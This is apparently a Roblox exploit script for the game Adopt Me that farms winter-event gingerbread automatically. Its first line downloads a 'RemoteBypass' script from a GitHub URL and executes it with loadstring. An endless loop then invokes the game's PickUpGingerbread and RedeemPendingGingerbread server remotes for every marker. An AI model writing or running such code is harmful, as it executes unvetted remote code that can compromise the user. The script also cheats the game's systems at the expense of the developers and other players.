loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()

-- Repeat every 60 seconds
while true do
    wait(1)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local gingerbreadMarkersFolder = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("IceSkating"):WaitForChild("GingerbreadMarkers")

    -- Loop through each object in the GingerbreadMarkers folder
    for _, marker in ipairs(gingerbreadMarkersFolder:GetChildren()) do
        -- Create a new args table with the current marker's name
        local args = {
            [1] = marker.Name -- Use the name of the current marker
        }

        -- Invoke the server with the current marker's name
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/PickUpGingerbread"):InvokeServer(unpack(args))

        -- Wait for 0.1 seconds before the next call
        wait(0.1)
    end

    wait(1)
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/RedeemPendingGingerbread"):FireServer()

    -- Wait 60 seconds before repeating the process
    wait(60)
end
